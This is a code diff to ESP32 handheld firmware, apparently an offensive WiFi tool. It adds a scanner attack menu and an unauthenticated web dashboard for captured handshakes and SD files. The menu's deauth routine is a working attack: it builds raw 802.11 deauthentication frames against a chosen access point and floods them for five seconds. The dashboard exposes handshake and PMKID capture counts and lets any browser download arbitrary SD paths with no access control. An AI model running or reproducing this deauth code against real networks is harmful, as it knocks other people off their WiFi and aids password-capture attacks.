@@ -2337,10 +2337,163 @@ void wifiscanSetup() {
   runUI();
 }
 
+// ── Attack popup menu (short-tap SELECT on a network) ───────────────────────
+static const char* ATTACK_OPTIONS[] = {
+  "Deauth 5s",
+  "Pin to Pwn whitelist",
+  "Cancel"
+};
+static constexpr int ATTACK_OPTIONS_N = 3;
+static bool attackMenuOpen = false;
+static int  attackMenuSel  = 0;
+
+static void drawAttackMenu(const ScanRec& r) {
+  const int X = 16, Y = 60, W = 208, H = 160;
+  tft.fillRect(X, Y, W, H, TFT_BLACK);
+  tft.drawRect(X,     Y,     W,     H,     0xE0E6);
+  tft.drawRect(X + 1, Y + 1, W - 2, H - 2, 0xE0E6);
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+  tft.setTextColor(0xE0E6, TFT_BLACK);
+  tft.setCursor(X + 8, Y + 6);
+  tft.print("[ ATTACK ]");
+  tft.setCursor(X + 8, Y + 24);
+  tft.setTextColor(WHITE, TFT_BLACK);
+  char ssid[18];
+  strncpy(ssid, r.ssid[0] ? r.ssid : "(hidden)", 17); ssid[17] = 0;
+  tft.print(ssid);
+
+  for (int i = 0; i < ATTACK_OPTIONS_N; i++) {
+    int ry = Y + 50 + i * 22;
+    if (i == attackMenuSel) tft.fillRect(X + 4, ry - 2, W - 8, 20, 0x6020);
+    tft.setTextColor(i == attackMenuSel ? WHITE : 0xE0E6,
+                     i == attackMenuSel ? 0x6020 : TFT_BLACK);
+    tft.setCursor(X + 10, ry);
+    tft.print(ATTACK_OPTIONS[i]);
+  }
+
+  tft.setTextColor(0x6020, TFT_BLACK);
+  tft.setCursor(X + 6, Y + H - 16);
+  tft.print("tap SEL=run  hold=back");
+}
+
+static void attackDeauth(const ScanRec& r) {
+  tft.fillRect(16, 60, 208, 160, TFT_BLACK);
+  tft.setTextFont(2);
+  tft.setTextColor(0xE0E6, TFT_BLACK);
+  tft.setCursor(24, 80);
+  tft.print("Deauthing...");
+  tft.setCursor(24, 110);
+  char buf[40];
+  snprintf(buf, sizeof(buf), "ch%u  %s",
+           (unsigned)r.channel, r.ssid[0] ? r.ssid : "(hidden)");
+  tft.print(buf);
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_channel(r.channel, WIFI_SECOND_CHAN_NONE);
+
+  uint8_t f[26] = {
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0,
+    0x00, 0x00, 0x07, 0x00
+  };
+  memcpy(&f[10], r.bssid, 6);
+  memcpy(&f[16], r.bssid, 6);
+
+  uint32_t t0 = millis();
+  uint32_t sent = 0;
+  while ((millis() - t0) < 5000) {
+    Deauther::wsl_bypasser_send_raw_frame(f, sizeof(f));
+    sent++;
+    delayMicroseconds(1500);
+  }
+
+  tft.setCursor(24, 140);
+  tft.setTextColor(0x07C0, TFT_BLACK);
+  snprintf(buf, sizeof(buf), "Sent %lu frames", (unsigned long)sent);
+  tft.print(buf);
+  delay(1200);
+}
+
+static void attackPinWhitelist(const ScanRec& r) {
+  tft.fillRect(16, 60, 208, 160, TFT_BLACK);
+  tft.setTextFont(2);
+  tft.setTextColor(0xE0E6, TFT_BLACK);
+  tft.setCursor(24, 80);
+  tft.print("Pinning...");
+
+  bool ok = false;
+  if (!SD.exists("/pwn")) SD.mkdir("/pwn");
+  File f = SD.open("/pwn/whitelist.txt", FILE_APPEND);
+  if (f) {
+    if (r.ssid[0]) f.printf("# %s\n", r.ssid);
+    f.printf("%02X:%02X:%02X:%02X:%02X:%02X\n",
+             r.bssid[0], r.bssid[1], r.bssid[2], r.bssid[3], r.bssid[4], r.bssid[5]);
+    f.close();
+    ok = true;
+  }
+
+  tft.setCursor(24, 110);
+  tft.setTextColor(ok ? 0x07C0 : 0xE0E6, TFT_BLACK);
+  tft.print(ok ? "Pinned to /pwn/whitelist.txt" : "SD write failed");
+  delay(1500);
+}
+
 void wifiscanLoop() {
+
+  // Attack popup takes input precedence over the normal list.
+  if (attackMenuOpen) {
+    if (isButtonPressed(BTN_SELECT)) {
+      // Long-hold SELECT closes the popup without firing.
+      attackMenuOpen = false;
+      while (isButtonPressed(BTN_SELECT)) delay(20);
+      (void)isSelectShortTapped();
+      displayWiFiList(true);
+      return;
+    }
+    static bool upPrev = false, downPrev = false, leftPrev = false;
+    bool up = !pcf.digitalRead(BTN_UP);
+    bool dn = !pcf.digitalRead(BTN_DOWN);
+    bool lf = !pcf.digitalRead(BTN_LEFT);
+    if (up && !upPrev) {
+      attackMenuSel = (attackMenuSel + ATTACK_OPTIONS_N - 1) % ATTACK_OPTIONS_N;
+      drawAttackMenu(scanRecs[currentIndex]);
+    }
+    if (dn && !downPrev) {
+      attackMenuSel = (attackMenuSel + 1) % ATTACK_OPTIONS_N;
+      drawAttackMenu(scanRecs[currentIndex]);
+    }
+    if (lf && !leftPrev) {
+      attackMenuOpen = false;
+      displayWiFiList(true);
+    }
+    upPrev = up; downPrev = dn; leftPrev = lf;
+
+    if (isSelectShortTapped()) {
+      const ScanRec& r = scanRecs[currentIndex];
+      if      (attackMenuSel == 0) attackDeauth(r);
+      else if (attackMenuSel == 1) attackPinWhitelist(r);
+      // option 2 = Cancel
+      attackMenuOpen = false;
+      displayWiFiList(true);
+    }
+    delay(15);
+    return;
+  }
 
   if (feature_active && isButtonPressed(BTN_SELECT)) {
     feature_exit_requested = true;
+    return;
+  }
+
+  // Short SELECT tap on a network row opens the attack menu.
+  if (!isScanning && scanRecCount > 0 && currentIndex >= 0
+      && currentIndex < scanRecCount && isSelectShortTapped()) {
+    attackMenuOpen = true;
+    attackMenuSel  = 0;
+    drawAttackMenu(scanRecs[currentIndex]);
     return;
   }
 
@@ -8029,4 +8182,396 @@ void pwnExit() {
 
 }  // namespace PwnMode
 
+
+/* ════════════════════════════════════════════════════════════════════════════
+   WebDashboard — small HTTP server on port 80. Serves a single-page web UI
+   plus JSON API endpoints over the WiFi creds saved by OtaGithub / WifiSetup.
+   ════════════════════════════════════════════════════════════════════════════ */
+namespace OtaGithub {
+  bool _loadCreds(String&, String&);
+}
+
+namespace WebDashboard {
+
+static WebServer dashServer(80);
+static bool      serverUp     = false;
+static bool      wifiUp       = false;
+static uint32_t  startMs      = 0;
+static uint32_t  lastDrawMs   = 0;
+static int       reqCount     = 0;
+
+static const uint16_t WD_RED  = 0xE0E6;
+static const uint16_t WD_DIM  = 0x6020;
+static const uint16_t WD_GRN  = 0x07C0;
+
+// Embedded single-page UI (mobile-first, dark Arasaka palette).
+static const char INDEX_HTML[] PROGMEM = R"HTML(<!doctype html><html><head><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<title>Dark-Div</title>
+<style>
+:root{--bg:#0b0b0d;--fg:#ff2c3c;--dim:#6a1722;--mut:#9085;}
+*{box-sizing:border-box}html,body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.45 ui-monospace,Menlo,monospace}
+header{padding:14px 16px;border-bottom:1px solid var(--dim);display:flex;justify-content:space-between;align-items:center}
+header h1{margin:0;font-size:16px;letter-spacing:2px}
+nav{display:flex;gap:0;border-bottom:1px solid var(--dim);overflow:auto}
+nav button{flex:1;padding:12px;background:transparent;color:var(--fg);border:0;border-right:1px solid var(--dim);font:inherit;cursor:pointer}
+nav button.active{background:var(--dim);color:#fff}
+main{padding:14px 16px}
+.kv{display:grid;grid-template-columns:130px 1fr;gap:6px 12px;font-size:13px}
+.kv b{color:var(--fg);font-weight:normal}.kv span{color:#fff;word-break:break-all}
+ul{list-style:none;padding:0;margin:8px 0}
+li{padding:8px 0;border-bottom:1px solid var(--dim);display:flex;justify-content:space-between;gap:8px}
+a{color:var(--fg);text-decoration:none}a:hover{color:#fff}
+.muted{color:#888;font-size:12px}
+.tag{font-size:11px;color:var(--bg);background:var(--fg);padding:2px 6px;border-radius:3px}
+.face{font-size:32px;text-align:center;padding:14px;color:#fff}
+.row{display:flex;gap:8px;flex-wrap:wrap;margin:8px 0}
+.row a,.row button{padding:8px 12px;border:1px solid var(--dim);background:transparent;color:var(--fg);font:inherit;cursor:pointer}
+.row a:hover,.row button:hover{background:var(--dim);color:#fff}
+</style></head><body>
+<header><h1>[ DARK-DIV ]</h1><span class=muted id=ip></span></header>
+<nav>
+ <button class=active data-tab=status>Status</button>
+ <button data-tab=pwn>Pwn</button>
+ <button data-tab=cap>Captures</button>
+ <button data-tab=sd>SD</button>
+</nav>
+<main id=main></main>
+<script>
+const $=s=>document.querySelector(s);
+let tab='status';
+async function get(p){const r=await fetch(p);return r.ok?r.json():null}
+function fmt(n){return new Intl.NumberFormat().format(n)}
+function fmtBytes(n){if(n<1024)return n+' B';if(n<1048576)return (n/1024).toFixed(1)+' KB';return (n/1048576).toFixed(1)+' MB'}
+function fmtAge(s){const d=s/86400|0;s%=86400;const h=s/3600|0;s%=3600;const m=s/60|0;if(d)return d+'d '+h+'h';if(h)return h+'h '+m+'m';return m+'m'}
+function fmtUptime(ms){const s=ms/1000|0;return fmtAge(s)}
+async function status(){const j=await get('/api/info');if(!j){$('#main').textContent='offline';return}
+  $('#ip').textContent=j.ip;
+  $('#main').innerHTML=`<div class=kv>
+  <b>Device</b><span>${j.device}</span>
+  <b>Firmware</b><span>${j.version}</span>
+  <b>WiFi SSID</b><span>${j.ssid||'-'}</span>
+  <b>IP</b><span>${j.ip}</span>
+  <b>MAC</b><span>${j.mac}</span>
+  <b>RSSI</b><span>${j.rssi} dBm</span>
+  <b>Uptime</b><span>${fmtUptime(j.uptime_ms)}</span>
+  <b>Free heap</b><span>${fmtBytes(j.free_heap)}</span>
+  <b>PSRAM free</b><span>${fmtBytes(j.free_psram)}</span>
+  <b>SD card</b><span>${j.sd_mounted?fmtBytes(j.sd_total)+' total':'NOT MOUNTED'}</span>
+  <b>Battery</b><span>${j.battery_v.toFixed(2)} V</span>
+  <b>Requests served</b><span>${j.req_count}</span></div>`}
+async function pwn(){const j=await get('/api/pwn');if(!j){$('#main').textContent='no /pwn/state.json';return}
+  $('#main').innerHTML=`<div class=face>( ^_^ )</div><div class=kv>
+  <b>Name</b><span>${j.name}</span>
+  <b>Age</b><span>${fmtAge(j.uptime_s)}</span>
+  <b>Lifetime HS</b><span>${fmt(j.handshakes)}</span>
+  <b>Lifetime PMKIDs</b><span>${fmt(j.pmkids)}</span>
+  <b>Sessions</b><span>${fmt(j.sessions)}</span>
+  <b>Best session</b><span>${fmt(j.best)}</span></div>`}
+async function caps(){const j=await get('/api/captures');if(!j){$('#main').textContent='no /captures dir';return}
+  if(!j.files.length){$('#main').innerHTML='<p class=muted>No captures yet</p>';return}
+  $('#main').innerHTML='<ul>'+j.files.map(f=>`<li><a href="/api/dl?path=/captures/${encodeURIComponent(f.name)}">${f.name}</a><span class=tag>${fmtBytes(f.size)}</span></li>`).join('')+'</ul>'}
+async function sd(path='/'){const j=await get('/api/sd?path='+encodeURIComponent(path));if(!j){$('#main').textContent='SD error';return}
+  let html=`<div class=row><span class=muted>${path}</span></div><ul>`;
+  if(path!=='/'){const up=path.split('/').slice(0,-1).join('/')||'/';html+=`<li><a href="#" data-dir="${up}">.. (up)</a></li>`}
+  for(const f of j.entries){
+    if(f.dir)html+=`<li><a href="#" data-dir="${f.path}">${f.name}/</a></li>`;
+    else html+=`<li><a href="/api/dl?path=${encodeURIComponent(f.path)}">${f.name}</a><span class=tag>${fmtBytes(f.size)}</span></li>`;
+  }
+  $('#main').innerHTML=html+'</ul>';
+  document.querySelectorAll('[data-dir]').forEach(a=>a.onclick=e=>{e.preventDefault();sd(a.dataset.dir)})}
+function load(){if(tab==='status')status();else if(tab==='pwn')pwn();else if(tab==='cap')caps();else if(tab==='sd')sd('/')}
+document.querySelectorAll('nav button').forEach(b=>b.onclick=()=>{document.querySelectorAll('nav button').forEach(x=>x.classList.remove('active'));b.classList.add('active');tab=b.dataset.tab;load()});
+load();setInterval(()=>{if(tab==='status'||tab==='pwn')load()},5000);
+</script></body></html>)HTML";
+
+static const char* sdSizeBytes(uint64_t n, char* out, size_t cap) {
+  snprintf(out, cap, "%llu", (unsigned long long)n);
+  return out;
+}
+
+static void sendJsonHeader() {
+  dashServer.sendHeader("Cache-Control", "no-store");
+  dashServer.sendHeader("Access-Control-Allow-Origin", "*");
+}
+
+static void handleRoot() {
+  reqCount++;
+  dashServer.sendHeader("Cache-Control", "no-store");
+  dashServer.send_P(200, "text/html; charset=utf-8", INDEX_HTML);
+}
+
+static void handleInfo() {
+  reqCount++;
+  String ssid, pw;
+  OtaGithub::_loadCreds(ssid, pw);
+  bool sdMounted = (SD.cardSize() > 0);
+  uint8_t mac[6]; esp_read_mac(mac, ESP_MAC_WIFI_STA);
+  char macStr[18];
+  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+  char sdTot[24]; sdSizeBytes(sdMounted ? SD.cardSize() : 0, sdTot, sizeof(sdTot));
+
+  String out;
+  out.reserve(512);
+  out  = "{\"device\":\"ESP32-DIV V2\",\"version\":\"Dark-Div\",";
+  out += "\"ssid\":\"" + ssid + "\",";
+  out += "\"ip\":\""   + WiFi.localIP().toString() + "\",";
+  out += "\"mac\":\""  + String(macStr) + "\",";
+  out += "\"rssi\":"   + String(WiFi.RSSI()) + ",";
+  out += "\"uptime_ms\":" + String((uint32_t)millis()) + ",";
+  out += "\"free_heap\":" + String((uint32_t)ESP.getFreeHeap()) + ",";
+  out += "\"free_psram\":" + String((uint32_t)ESP.getFreePsram()) + ",";
+  out += "\"sd_mounted\":" + String(sdMounted ? "true" : "false") + ",";
+  out += "\"sd_total\":"   + String(sdTot) + ",";
+  out += "\"battery_v\":"  + String(readBatteryVoltage(), 2) + ",";
+  out += "\"req_count\":"  + String(reqCount);
+  out += "}";
+
+  sendJsonHeader();
+  dashServer.send(200, "application/json", out);
+}
+
+static void handlePwn() {
+  reqCount++;
+  if (!SD.exists("/pwn/state.json")) {
+    sendJsonHeader();
+    dashServer.send(404, "application/json", "{\"error\":\"no state\"}");
+    return;
+  }
+  File f = SD.open("/pwn/state.json", FILE_READ);
+  if (!f) {
+    sendJsonHeader();
+    dashServer.send(500, "application/json", "{\"error\":\"sd open failed\"}");
+    return;
+  }
+  String body;
+  body.reserve((size_t)f.size() + 16);
+  while (f.available()) body += (char)f.read();
+  f.close();
+  sendJsonHeader();
+  dashServer.send(200, "application/json", body);
+}
+
+static void appendDirJson(String& out, const String& path, bool listSubdirs) {
+  File dir = SD.open(path);
+  if (!dir || !dir.isDirectory()) { out += "[]"; return; }
+  out += "[";
+  bool first = true;
+  while (true) {
+    File e = dir.openNextFile();
+    if (!e) break;
+    String nm = String(e.name());
+    // ESP-IDF returns paths with full prefix on some builds; strip to leaf.
+    int slash = nm.lastIndexOf('/');
+    String leaf = (slash >= 0) ? nm.substring(slash + 1) : nm;
+    String full = path;
+    if (!full.endsWith("/")) full += "/";
+    full += leaf;
+    if (!first) out += ",";
+    first = false;
+    out += "{\"name\":\"" + leaf + "\",\"path\":\"" + full + "\",\"size\":" + String((uint32_t)e.size())
+         + ",\"dir\":" + String(e.isDirectory() ? "true" : "false") + "}";
+    e.close();
+    if (!listSubdirs) {
+      // Cap output at a reasonable size when listing all files.
+      if (out.length() > 16000) break;
+    }
+  }
+  dir.close();
+  out += "]";
+}
+
+static void handleCaptures() {
+  reqCount++;
+  String out = "{\"files\":";
+  appendDirJson(out, "/captures", true);
+  out += "}";
+  sendJsonHeader();
+  dashServer.send(200, "application/json", out);
+}
+
+static void handleSdList() {
+  reqCount++;
+  String path = dashServer.hasArg("path") ? dashServer.arg("path") : "/";
+  if (path.length() == 0) path = "/";
+  String out = "{\"path\":\"" + path + "\",\"entries\":";
+  appendDirJson(out, path, true);
+  out += "}";
+  sendJsonHeader();
+  dashServer.send(200, "application/json", out);
+}
+
+static void handleDownload() {
+  reqCount++;
+  if (!dashServer.hasArg("path")) {
+    dashServer.send(400, "text/plain", "missing path");
+    return;
+  }
+  String path = dashServer.arg("path");
+  File f = SD.open(path, FILE_READ);
+  if (!f) {
+    dashServer.send(404, "text/plain", "not found");
+    return;
+  }
+  dashServer.sendHeader("Content-Disposition",
+                        String("attachment; filename=\"") +
+                        path.substring(path.lastIndexOf('/') + 1) + "\"");
+  dashServer.streamFile(f, "application/octet-stream");
+  f.close();
+}
+
+static void handleNotFound() {
+  dashServer.send(404, "text/plain", "404");
+}
+
+// ── UI screen ────────────────────────────────────────────────────────────────
+static void drawShell() {
+  tft.fillScreen(TFT_BLACK);
+  tft.drawFastHLine(0, 0, 240, WD_RED);
+  tft.drawFastHLine(0, 24, 240, WD_DIM);
+  tft.drawFastHLine(0, 296, 240, WD_DIM);
+  tft.drawFastHLine(0, 319, 240, WD_RED);
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+  tft.setTextColor(WD_RED, TFT_BLACK);
+  tft.setCursor(50, 6);
+  tft.print("[ WEB DASHBOARD ]");
+  tft.setTextColor(WD_DIM, TFT_BLACK);
+  tft.setCursor(8, 301);
+  tft.print("Hold SELECT to exit");
+}
+
+static void drawStatus() {
+  tft.fillRect(0, 30, 240, 260, TFT_BLACK);
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+  char buf[64];
+
+  if (!wifiUp) {
+    tft.setTextColor(WD_RED, TFT_BLACK);
+    tft.setCursor(10, 40);
+    tft.print("WiFi not connected.");
+    tft.setCursor(10, 60);
+    tft.print("Open Settings -> WiFi");
+    tft.setCursor(10, 76);
+    tft.print("to set credentials.");
+    return;
+  }
+
+  tft.setTextColor(WD_GRN, TFT_BLACK);
+  tft.setCursor(10, 40);
+  snprintf(buf, sizeof(buf), "Online: %s", WiFi.SSID().c_str());
+  tft.print(buf);
+
+  tft.setTextColor(WD_RED, TFT_BLACK);
+  tft.setCursor(10, 64);
+  snprintf(buf, sizeof(buf), "IP:   %s", WiFi.localIP().toString().c_str());
+  tft.print(buf);
+  tft.setCursor(10, 84);
+  snprintf(buf, sizeof(buf), "RSSI: %d dBm", WiFi.RSSI());
+  tft.print(buf);
+
+  tft.setTextColor(WD_RED, TFT_BLACK);
+  tft.setCursor(10, 116);
+  tft.print("Open in your browser:");
+  tft.setTextColor(WHITE, TFT_BLACK);
+  tft.setCursor(10, 134);
+  snprintf(buf, sizeof(buf), "http://%s/", WiFi.localIP().toString().c_str());
+  tft.print(buf);
+
+  tft.setTextColor(WD_DIM, TFT_BLACK);
+  tft.setCursor(10, 168);
+  tft.print("Tabs: Status / Pwn /");
+  tft.setCursor(10, 184);
+  tft.print("      Captures / SD");
+
+  tft.setTextColor(WD_RED, TFT_BLACK);
+  tft.setCursor(10, 216);
+  uint32_t up = (millis() - startMs) / 1000;
+  snprintf(buf, sizeof(buf), "Up:   %02lu:%02lu:%02lu",
+           (unsigned long)(up / 3600),
+           (unsigned long)((up / 60) % 60),
+           (unsigned long)(up % 60));
+  tft.print(buf);
+
+  tft.setCursor(10, 232);
+  snprintf(buf, sizeof(buf), "Requests served: %d", reqCount);
+  tft.print(buf);
+
+  tft.setCursor(10, 256);
+  snprintf(buf, sizeof(buf), "Heap: %u KB",
+           (unsigned)(ESP.getFreeHeap() / 1024));
+  tft.print(buf);
+}
+
+// ── Setup / loop / exit ──────────────────────────────────────────────────────
+void setup() {
+  reqCount = 0;
+  startMs  = millis();
+  wifiUp   = false;
+  serverUp = false;
+  drawShell();
+
+  String ssid, pw;
+  if (!OtaGithub::_loadCreds(ssid, pw)) {
+    drawStatus();
+    return;
+  }
+
+  tft.setTextColor(WD_RED, TFT_BLACK);
+  tft.setTextFont(2); tft.setTextSize(1);
+  tft.setCursor(10, 40); tft.print("Connecting to WiFi...");
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(false, true);
+  WiFi.begin(ssid.c_str(), pw.c_str());
+  uint32_t t0 = millis();
+  while (WiFi.status() != WL_CONNECTED && (millis() - t0) < 12000) {
+    delay(200);
+  }
+  if (WiFi.status() != WL_CONNECTED) {
+    tft.setTextColor(WD_RED, TFT_BLACK);
+    tft.setCursor(10, 60); tft.print("Connect failed.");
+    return;
+  }
+  wifiUp = true;
+
+  dashServer.on("/",              handleRoot);
+  dashServer.on("/api/info",      handleInfo);
+  dashServer.on("/api/pwn",       handlePwn);
+  dashServer.on("/api/captures",  handleCaptures);
+  dashServer.on("/api/sd",        handleSdList);
+  dashServer.on("/api/dl",        handleDownload);
+  dashServer.onNotFound(handleNotFound);
+  dashServer.begin();
+  serverUp = true;
+
+  drawStatus();
+  lastDrawMs = millis();
+}
+
+void loop() {
+  if (serverUp) dashServer.handleClient();
+
+  uint32_t now = millis();
+  if ((uint32_t)(now - lastDrawMs) > 1000) {
+    lastDrawMs = now;
+    drawStatus();
+  }
+
+  if (isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+  }
+  delay(2);
+}
+
+void exit() {
+  if (serverUp) {
+    dashServer.stop();
+    serverUp = false;
+  }
+}
+
+}  // namespace WebDashboard
 
